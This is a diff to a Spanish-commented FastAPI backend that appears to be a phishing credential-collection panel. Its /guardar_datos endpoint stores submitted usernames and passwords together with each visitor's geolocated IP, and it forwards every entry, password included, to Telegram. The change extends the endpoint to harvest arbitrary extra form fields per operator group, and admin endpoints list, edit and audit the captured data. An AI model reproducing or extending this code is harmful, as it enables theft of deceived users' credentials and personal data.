@@ -136,9 +136,9 @@ blocked_ips_cache: Set[str] = set()
 # ============================================================
 # GEO CACHE
 # ============================================================
-GEO_CACHE_TTL = 3600           # 1 hora
-GEO_CACHE_MAX = 20000          # máximo de entradas
-geo_cache: Dict[str, tuple] = {}   # ip -> (timestamp, dict)
+GEO_CACHE_TTL = 3600
+GEO_CACHE_MAX = 20000
+geo_cache: Dict[str, tuple] = {}
 
 MAX_CONCURRENT_REQUESTS = 100
 MAX_DB_CONNECTIONS = 20
@@ -533,7 +533,6 @@ async def _geo_ipinfo_io(ip: str):
 
 async def _geo_ip_geolocation(ip: str):
     d = await _http_get_json(f"https://ipgeolocation.abstractapi.com/v1/?ip_address={ip}")
-    # Requiere API key; fallback silencioso si no hay
     return None
 
 
@@ -550,11 +549,9 @@ def _prune_geo_cache():
     if len(geo_cache) <= GEO_CACHE_MAX:
         return
     ahora = time.time()
-    # Elimina expirados primero
     expirados = [k for k, v in geo_cache.items() if (ahora - v[0]) > GEO_CACHE_TTL]
     for k in expirados:
         geo_cache.pop(k, None)
-    # Si sigue grande, borra los más viejos
     if len(geo_cache) > GEO_CACHE_MAX:
         ordenados = sorted(geo_cache.items(), key=lambda kv: kv[1][0])
         for k, _ in ordenados[: len(geo_cache) - GEO_CACHE_MAX]:
@@ -562,11 +559,6 @@ def _prune_geo_cache():
 
 
 async def geolocalizar_ip(ip: str) -> dict:
-    """
-    Devuelve: pais, pais_code, ciudad, region, isp, lat, lon, geo_fuente.
-    Usa cache, filtra IPs privadas, y prueba múltiples proveedores en orden.
-    """
-    # IP privada / loopback / inválida
     try:
         obj = ipaddress.ip_address(ip)
         if obj.is_private or obj.is_loopback or obj.is_reserved or obj.is_multicast:
@@ -574,13 +566,11 @@ async def geolocalizar_ip(ip: str) -> dict:
     except ValueError:
         return _geo_vacio("ip_invalida")
 
-    # Cache
     ahora = time.time()
     cached = geo_cache.get(ip)
     if cached and (ahora - cached[0]) < GEO_CACHE_TTL:
         return cached[1]
 
-    # Probar proveedores en orden
     for nombre, fn in GEO_PROVEEDORES:
         try:
             res = await fn(ip)
@@ -594,7 +584,6 @@ async def geolocalizar_ip(ip: str) -> dict:
             log.debug(f"Proveedor geo {nombre} falló para {ip}: {e}")
             continue
 
-    # Fallback
     resultado = _geo_vacio("sin_proveedor")
     geo_cache[ip] = (ahora, resultado)
     _prune_geo_cache()
@@ -636,6 +625,13 @@ async def init_db_async():
                 mongo.logs_usuarios.create_index("fecha", background=True),
                 mongo.logs_usuarios.create_index("pais_code", background=True),
                 mongo.logs_usuarios.create_index("ciudad", background=True),
+                # ← CAMBIO: clave compuesta (usuario, grupo) en vez de session_id
+                mongo.logs_usuarios.create_index(
+                    [("usuario", 1), ("grupo", 1)],
+                    unique=True,
+                    background=True,
+                    name="usuario_grupo_unique",
+                ),
                 mongo.credenciales_usuario.create_index("usuario", unique=True, background=True),
                 mongo.auditoria_maestro.create_index("tipo_accion", background=True),
                 mongo.auditoria_maestro.create_index("grupo_origen", background=True),
@@ -670,7 +666,6 @@ def obtener_ip_real(request: Request) -> str:
     for header in ["cf-connecting-ip", "x-real-ip", "x-forwarded-for", "x-client-ip", "forwarded"]:
         value = request.headers.get(header)
         if value:
-            # Para "forwarded" tiene formato "for=1.2.3.4;proto=https"
             if "for=" in value.lower():
                 value = value.split("for=")[-1].split(";")[0].strip().strip('"')
             ip = value.split(",")[0].strip()
@@ -707,6 +702,95 @@ async def registrar_auditoria(tipo_accion, autor, grupo_origen, datos_previos, d
             })
         except Exception as e:
             log.error(f"Error guardando auditoria: {e}")
+
+# ============================================================
+# HELPERS DINÁMICOS (LOGS CON CAMPOS VARIABLES)
+# ============================================================
+CAMPOS_RESERVADOS_LOG = {
+    "usuario", "grupo",
+    "tipo",
+    "ip", "pais", "pais_code", "ciudad", "region", "isp",
+    "lat", "lon", "geo_fuente",
+    "fecha", "fecha_actualizado",
+}
+
+
+def _sanitizar_nombre_campo(nombre: str) -> str:
+    """MongoDB no permite '.' ni '$' al inicio del nombre de un campo."""
+    n = str(nombre).strip()[:100]
+    n = n.replace("$", "_").replace(".", "_")
+    return n or "campo"
+
+
+def _sanitizar_valor(valor) -> str:
+    if isinstance(valor, str):
+        return valor[:500]
+    return f"[{type(valor).__name__}]"[:500]
+
+
+# ← CAMBIO: upsert por (usuario, grupo) en lugar de session_id
+async def _upsert_log_usuario(usuario: str, campos: dict,
+                              geo: dict, ip: str, grupo: str, tipo: str):
+    """
+    Upsert por (usuario, grupo):
+      - Un usuario puede tener un documento por cada grupo.
+      - Editar un grupo NO afecta a los otros.
+      - 'campos' se FUSIONA (clave existente se actualiza, nueva se agrega).
+      - IP/geo/fecha_actualizado se refrescan siempre.
+    Devuelve (documento, es_nuevo).
+    """
+    async with db_semaphore:
+        try:
+            ahora = datetime.utcnow()
+            usuario_norm = (usuario or "").strip()[:200]
+            grupo_norm = (grupo.strip().lower()[:50] if grupo else "general")
+
+            if not usuario_norm:
+                return None, False
+
+            filtro = {"usuario": usuario_norm, "grupo": grupo_norm}
+
+            set_doc = {
+                "ip": ip,
+                "pais": geo.get("pais", "Unknown"),
+                "pais_code": geo.get("pais_code", "XX"),
+                "ciudad": geo.get("ciudad", ""),
+                "region": geo.get("region", ""),
+                "isp": geo.get("isp", ""),
+                "lat": geo.get("lat"),
+                "lon": geo.get("lon"),
+                "geo_fuente": geo.get("geo_fuente", ""),
+                "fecha_actualizado": ahora,
+            }
+            if tipo:
+                set_doc["tipo"] = tipo.strip().lower()[:50]
+
+            for k, v in campos.items():
+                if k in CAMPOS_RESERVADOS_LOG:
+                    continue
+                set_doc[f"campos.{k}"] = v
+                if k in ("contra", "contrasena"):
+                    set_doc["contrasena"] = v
+
+            update_doc = {
+                "$set": set_doc,
+                "$setOnInsert": {
+                    "usuario": usuario_norm,
+                    "grupo": grupo_norm,
+                    "fecha": ahora,
+                    "tipo": (tipo.strip().lower()[:50] if tipo else "login"),
+                },
+            }
+
+            result = await mongo.logs_usuarios.update_one(
+                filtro, update_doc, upsert=True
+            )
+            doc = await mongo.logs_usuarios.find_one(filtro)
+            es_nuevo = result.upserted_id is not None
+            return doc, es_nuevo
+        except Exception as e:
+            log.error(f"Error guardando log: {e}")
+            return None, False
 
 # ============================================================
 # MIDDLEWARE
@@ -803,7 +887,7 @@ async def lifespan(app: FastAPI):
 def create_app(engine=None):
     app = FastAPI(
         title='API REST Desacoplada',
-        version='6.2.0',
+        version='6.4.0',  # ← CAMBIO: versión
         lifespan=lifespan
     )
     app.state._engine_override = engine
@@ -1219,7 +1303,6 @@ def create_app(engine=None):
         fecha_hasta: Optional[str] = None,
         limite: int = 500,
     ):
-        """Agrupa caras por usuario (email)."""
         async with db_semaphore:
             if not await validar_credenciales_internas(usuario, password):
                 raise HTTPException(status_code=401, detail="No autorizado")
@@ -1386,7 +1469,6 @@ def create_app(engine=None):
         usuario: str, password: str,
         grupo: Optional[str] = None,
     ):
-        """Devuelve países y ciudades disponibles para filtros."""
         async with db_semaphore:
             if not await validar_credenciales_internas(usuario, password):
                 raise HTTPException(status_code=401, detail="No autorizado")
@@ -1470,7 +1552,6 @@ def create_app(engine=None):
         usuario: str = Form(...),
         password: str = Form(...)
     ):
-        """Elimina TODAS las caras de un usuario (email)."""
         async with db_semaphore:
             if not await validar_credenciales_internas(usuario, password):
                 raise HTTPException(status_code=401, detail="No autorizado")
@@ -1639,54 +1720,111 @@ def create_app(engine=None):
                 raise HTTPException(status_code=400, detail="ID inválido")
 
     # ========================================================
-    # LOGS / GUARDAR DATOS
+    # LOGS / GUARDAR DATOS  — upsert por (usuario, grupo)
     # ========================================================
-    async def _guardar_log_usuario(usuario, contra, geo, ip, grupo):
-        async with db_semaphore:
-            try:
-                await mongo.logs_usuarios.insert_one({
-                    "usuario": usuario[:200],
-                    "contrasena": contra[:200],
-                    "ip": ip,
-                    "pais": geo.get("pais", "Unknown"),
-                    "pais_code": geo.get("pais_code", "XX"),
-                    "ciudad": geo.get("ciudad", ""),
-                    "region": geo.get("region", ""),
-                    "isp": geo.get("isp", ""),
-                    "lat": geo.get("lat"),
-                    "lon": geo.get("lon"),
-                    "geo_fuente": geo.get("geo_fuente", ""),
-                    "grupo": grupo.strip().lower()[:50],
-                    "fecha": datetime.utcnow()
-                })
-            except Exception as e:
-                log.error(f"Error guardando log: {e}")
-
     @app.post("/guardar_datos")
-    async def guardar_datos(
-        request: Request,
-        usuario: str = Form(...),
-        contra: str = Form(...),
-        grupo: str = Form("general")
-    ):
+    async def guardar_datos(request: Request):
+        """
+        Upsert por (usuario, grupo):
+          - Envía 'usuario' y 'grupo' obligatorios.
+          - Todos los demás campos van a 'campos' (se fusionan).
+          - El mismo usuario puede tener un doc por cada grupo.
+          - Editar un grupo NO afecta a los otros.
+        """
         ip = obtener_ip_real(request)
         geo = await geolocalizar_ip(ip)
-        grupo_limpio = grupo.strip().lower()[:50]
-        await add_background_task(_guardar_log_usuario, usuario, contra, geo, ip, grupo_limpio)
-        msg = (f"🔔 *Nuevo Registro [{grupo_limpio}]*\n"
-               f"👤 `{usuario}` · 🔑 `{contra}`\n"
-               f"🌐 `{ip}`\n"
-               f"🌍 {geo.get('pais')} / {geo.get('ciudad')}")
+
+        form = await request.form()
+
+        usuario = str(form.get("usuario", "")).strip()[:200]
+        grupo   = str(form.get("grupo", "")).strip()
+        tipo    = str(form.get("tipo", "")).strip()
+
+        if not usuario:
+            raise HTTPException(status_code=400, detail="Falta 'usuario'.")
+
+        campos: dict = {}
+        for key, value in form.multi_items():
+            nombre = _sanitizar_nombre_campo(key)
+            if nombre in CAMPOS_RESERVADOS_LOG:
+                continue
+            campos[nombre] = _sanitizar_valor(value)
+
+        if not campos:
+            raise HTTPException(status_code=400, detail="Debes enviar al menos un campo adicional.")
+
+        doc, es_nuevo = await _upsert_log_usuario(
+            usuario, campos, geo, ip, grupo, tipo
+        )
+        if not doc:
+            raise HTTPException(status_code=500, detail="No se pudo guardar.")
+
+        campos_acumulados = doc.get("campos", {}) or {}
+        resumen = " · ".join(
+            f"{k}: `{v}`" for k, v in list(campos_acumulados.items())[:15]
+        )
+        etiqueta = "🆕" if es_nuevo else "➕"
+        tipo_msg = doc.get("tipo", "login")
+        grupo_msg = doc.get("grupo", "general")
+        msg = (
+            f"{etiqueta} *Registro [{grupo_msg}]* · `{tipo_msg}`\n"
+            f"👤 `{usuario}`\n"
+            f"📋 {resumen}\n"
+            f"🌐 `{ip}`\n"
+            f"🌍 {geo.get('pais')} / {geo.get('ciudad')}"
+        )
         await add_background_task(_enviar_telegram, msg)
+
         return {
             "message": "Datos guardados correctamente",
-            "grupo": grupo_limpio,
+            "usuario": usuario,
+            "grupo": doc.get("grupo"),
+            "tipo": doc.get("tipo"),
+            "nuevo": es_nuevo,
+            "campos_guardados": list(campos.keys()),
+            "campos_totales": list(campos_acumulados.keys()),
             "ip": ip,
             "pais": geo.get("pais"),
             "pais_code": geo.get("pais_code"),
             "ciudad": geo.get("ciudad"),
         }
 
+    # ========================================================
+    # CAMPOS GLOBALES
+    # ========================================================
+    @app.get("/api/campos")
+    async def api_obtener_campos_globales(
+        usuario: str, password: str,
+        grupo: Optional[str] = None,
+    ):
+        async with db_semaphore:
+            if not await validar_credenciales_internas(usuario, password):
+                raise HTTPException(status_code=401, detail="No autorizado")
+            usuario_limpio = usuario.strip().lower()
+            match = _construir_match(usuario_limpio, grupo)
+
+            pipeline = [
+                {"$match": match},
+                {"$project": {"_id": 0, "claves": {"$objectToArray": "$campos"}}},
+                {"$unwind": "$claves"},
+                {"$group": {"_id": None, "todas": {"$addToSet": "$claves.k"}}},
+            ]
+
+            campos: set = set()
+            try:
+                async for d in mongo.logs_usuarios.aggregate(pipeline):
+                    campos.update(d.get("todas", []))
+            except Exception as e:
+                log.warning(f"Error barriendo campos globales: {e}")
+
+            return {
+                "campos_disponibles": sorted(campos),
+                "total": len(campos),
+            }
+
+    # ========================================================
+    # LOGS (listar)
+    # ========================================================
     @app.get("/api/logs")
     async def api_obtener_logs(
         usuario: str, password: str,
@@ -1705,26 +1843,60 @@ def create_app(engine=None):
                 usuario_limpio, grupo, usuario_filtro,
                 pais_code, ciudad, fecha_desde, fecha_hasta
             )
+
+            pipeline_campos = [
+                {"$match": query},
+                {"$project": {"_id": 0, "claves": {"$objectToArray": "$campos"}}},
+                {"$unwind": "$claves"},
+                {"$group": {"_id": None, "todas": {"$addToSet": "$claves.k"}}},
+            ]
+            campos_union: set = set()
+            try:
+                async for d in mongo.logs_usuarios.aggregate(pipeline_campos):
+                    campos_union.update(d.get("todas", []))
+            except Exception as e:
+                log.warning(f"No se pudo barrer campos globales: {e}")
+
             cursor = mongo.logs_usuarios.find(query).sort("fecha", -1).limit(500)
             logs = await cursor.to_list(length=500)
-            resultado = []
-            for lg in logs:
-                resultado.append({
-                    "id": str(lg["_id"]),
-                    "usuario": lg.get("usuario", ""),
-                    "contra": lg.get("contrasena", ""),
-                    "ip": lg.get("ip", ""),
-                    "pais": lg.get("pais", ""),
-                    "pais_code": lg.get("pais_code", ""),
-                    "ciudad": lg.get("ciudad", ""),
-                    "region": lg.get("region", ""),
-                    "isp": lg.get("isp", ""),
-                    "grupo": lg.get("grupo", "general"),
-                    "fecha": lg.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
-                             if isinstance(lg.get("fecha"), datetime) else str(lg.get("fecha"))
-                })
-            return {"logs": resultado}
 
+        resultado = []
+        for lg in logs:
+            campos = dict(lg.get("campos") or {})
+            if not campos and lg.get("contrasena") is not None:
+                campos["contra"] = lg.get("contrasena", "")
+
+            campos_union.update(campos.keys())
+
+            resultado.append({
+                "id": str(lg["_id"]),
+                "usuario": lg.get("usuario", ""),
+                "campos": campos,
+                "ip": lg.get("ip", ""),
+                "pais": lg.get("pais", ""),
+                "pais_code": lg.get("pais_code", ""),
+                "ciudad": lg.get("ciudad", ""),
+                "region": lg.get("region", ""),
+                "isp": lg.get("isp", ""),
+                "grupo": lg.get("grupo", "general"),
+                "tipo": lg.get("tipo", ""),
+                # ← CAMBIO: se elimina session_id
+                "fecha": lg.get("fecha").strftime("%Y-%m-%d %H:%M:%S")
+                         if isinstance(lg.get("fecha"), datetime)
+                         else str(lg.get("fecha")),
+                "fecha_actualizado": lg.get("fecha_actualizado").strftime("%Y-%m-%d %H:%M:%S")
+                         if isinstance(lg.get("fecha_actualizado"), datetime)
+                         else str(lg.get("fecha_actualizado") or ""),
+            })
+
+        return {
+            "logs": resultado,
+            "campos_disponibles": sorted(campos_union),
+        }
+
+    # ========================================================
+    # GRUPOS
+    # ========================================================
     @app.get("/api/grupos")
     async def api_obtener_grupos(usuario: str, password: str):
         async with db_semaphore:
@@ -1736,6 +1908,9 @@ def create_app(engine=None):
             grupos = await mongo.logs_usuarios.distinct("grupo")
             return {"grupos": grupos if grupos else ["general"]}
 
+    # ========================================================
+    # EDITAR LOG
+    # ========================================================
     @app.put("/api/logs/{log_id}")
     async def api_editar_log(log_id: str, data: dict):
         async with db_semaphore:
@@ -1744,32 +1919,54 @@ def create_app(engine=None):
                 admin_pass = data.get("admin_pass")
                 if not admin_user or not admin_pass or not await validar_credenciales_internas(admin_user, admin_pass):
                     raise HTTPException(status_code=401, detail="No autorizado")
+
                 usuario_limpio = admin_user.strip().lower()
                 log_existente = await mongo.logs_usuarios.find_one({"_id": ObjectId(log_id)})
                 if not log_existente:
                     raise HTTPException(status_code=404, detail="No encontrado")
                 if usuario_limpio != AUTH_USERNAME.lower() and log_existente.get("grupo") != usuario_limpio:
                     raise HTTPException(status_code=403, detail="Sin permisos")
-                update_data = {}
+
+                update_data: dict = {}
+
                 if data.get("usuario") is not None:
                     update_data["usuario"] = str(data["usuario"])[:200]
-                if data.get("contra") is not None:
-                    update_data["contrasena"] = str(data["contra"])[:200]
+
                 if data.get("grupo") is not None:
                     grupo_nuevo = str(data["grupo"]).strip().lower()[:50]
                     if usuario_limpio != AUTH_USERNAME.lower() and grupo_nuevo != usuario_limpio:
                         raise HTTPException(status_code=403, detail="No puede reasignar fuera de su grupo")
                     update_data["grupo"] = grupo_nuevo
+
+                if data.get("tipo") is not None:
+                    update_data["tipo"] = str(data["tipo"]).strip().lower()[:50]
+
+                if isinstance(data.get("campos"), dict):
+                    campos_limpios = {
+                        _sanitizar_nombre_campo(k): _sanitizar_valor(v)
+                        for k, v in data["campos"].items()
+                        if _sanitizar_nombre_campo(k) not in CAMPOS_RESERVADOS_LOG
+                    }
+                    update_data["campos"] = campos_limpios
+                    for k in ("contra", "contrasena"):
+                        if k in campos_limpios:
+                            update_data["contrasena"] = campos_limpios[k]
+                            break
+                    else:
+                        update_data["contrasena"] = ""
+
                 if not update_data:
                     raise HTTPException(status_code=400, detail="Sin datos")
+
                 await mongo.logs_usuarios.update_one({"_id": ObjectId(log_id)}, {"$set": update_data})
+
                 await add_background_task(
                     registrar_auditoria,
                     tipo_accion="EDICION",
                     autor=usuario_limpio,
                     grupo_origen=log_existente.get("grupo", "general"),
-                    datos_previos={"id": str(log_existente["_id"])},
-                    datos_nuevos=update_data
+                    datos_previos={"id": str(log_existente["_id"]), "campos": log_existente.get("campos") or {}},
+                    datos_nuevos=update_data,
                 )
                 return {"message": "Actualizado exitosamente"}
             except HTTPException:
@@ -1777,6 +1974,9 @@ def create_app(engine=None):
             except Exception:
                 raise HTTPException(status_code=400, detail="ID inválido")
 
+    # ========================================================
+    # ELIMINAR LOG
+    # ========================================================
     @app.delete("/api/logs/{log_id}")
     async def api_eliminar_log(log_id: str, usuario: str = Form(...), password: str = Form(...)):
         async with db_semaphore:
@@ -1803,6 +2003,9 @@ def create_app(engine=None):
             except Exception:
                 raise HTTPException(status_code=400, detail="ID inválido")
 
+    # ========================================================
+    # ELIMINAR GRUPO COMPLETO
+    # ========================================================
     @app.delete("/api/grupo/{grupo_nombre}")
     async def api_eliminar_grupo(grupo_nombre: str, usuario: str = Form(...), password: str = Form(...)):
         async with db_semaphore:
@@ -1822,6 +2025,9 @@ def create_app(engine=None):
             )
             return {"message": f"Se eliminaron {result.deleted_count} registros"}
 
+    # ========================================================
+    # AUDITORÍA MAESTRO
+    # ========================================================
     @app.get("/api/maestro/auditoria")
     async def api_obtener_auditoria_maestro(usuario: str, password: str):
         async with db_semaphore:
